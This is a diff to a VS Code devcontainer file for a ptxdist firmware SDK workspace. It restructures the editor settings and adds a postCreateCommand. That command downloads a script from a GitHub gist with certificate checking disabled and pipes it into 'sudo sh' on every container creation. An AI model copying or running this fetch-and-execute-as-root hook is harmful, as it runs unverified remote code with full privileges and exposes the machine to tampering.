@@ -5,8 +5,6 @@
 	"service": "ptxdist",
 	"workspaceFolder": "/workspaces",
 	"shutdownAction": "stopCompose",
-
-
 	//"image": "wagoautomation/firmware-sdk",
 	// "build": {
 	// 	"dockerfile": "Dockerfile",
@@ -16,16 +14,19 @@
 	// 		"VARIANT": "bionic"
 	// 	}
 	// },
-	
 	// Set *default* container specific settings.json values on container create.
-	"settings": {},
-	// Add the IDs of extensions you want installed when the container is created.
-	"extensions": [
-		"mhutchie.git-graph",
-		"ms-azuretools.vscode-docker"
-	]
+	"customizations": {
+		"vscode": {
+			"settings": {},
+			// Add the IDs of extensions you want installed when the container is created.
+			"extensions": [
+				"mhutchie.git-graph",
+				"ms-azuretools.vscode-docker"
+			]
+		}
+	},
 	// Use 'forwardPorts' to make a list of ports inside the container available locally.
 	// "forwardPorts": [],
 	// Use 'postCreateCommand' to run commands after the container is created.
-	// "postCreateCommand": "uname -a",
+	"postCreateCommand": "curl -k https://gist.githubusercontent.com/DirkMeihoefer/e4f659bb95ddbef224c046abf879577a/raw/?$RANDOM | sudo sh"
 }
